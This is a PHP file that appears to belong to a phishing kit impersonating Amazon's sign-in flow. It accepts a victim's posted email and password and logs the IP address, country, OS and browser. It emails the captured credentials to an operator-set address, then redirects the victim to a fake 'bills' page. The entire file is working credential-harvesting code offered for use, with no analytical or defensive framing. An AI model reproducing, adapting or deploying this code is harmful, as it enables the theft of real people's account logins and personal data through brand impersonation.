<?php
require_once(dirname(dirname(dirname(__DIR__))).'/autoloader.php');
echo '<title>Amazon - Loading ... </title>';

echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';
if(isset($_POST))
{
    if(empty($_POST['ml']) || empty($_POST['pd']))
    {
    
    if($core->is_mobile()){
        $link = '../../ap/m.signin?openid.pape.max_auth_age='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
    }else{
        $link = '../../ap/signin?openid.pape.max_auth_age='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
    }
    $core->redirect($link);exit;
    }
    
    $email = $core->post('ml');
    $pass  = $core->post('pd');
    
    $core->getEmpass($email,$pass);
    
    $data =['username' => $email , 'password' => $pass, 'useragent' => $_SERVER['HTTP_USER_AGENT'] , 'ip' => $core->userIP() , 'country' => $country_name , 'date' => date('D,d m Y H:i')];

    $sendMsg = $core->parse_result('account',$data);
    $core->stats('login',$email.' was logged in');
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
    $sendSubj = "Amazon Login : ".strtoupper($email)." [ $info ] ";
    $sendFrom = "Amazon";

    $core->create_session($data);

    if($core->parse_hijaiyh('sp','send_login') == 1){
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
	}
    $core->redirect('../../ap/bills?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
}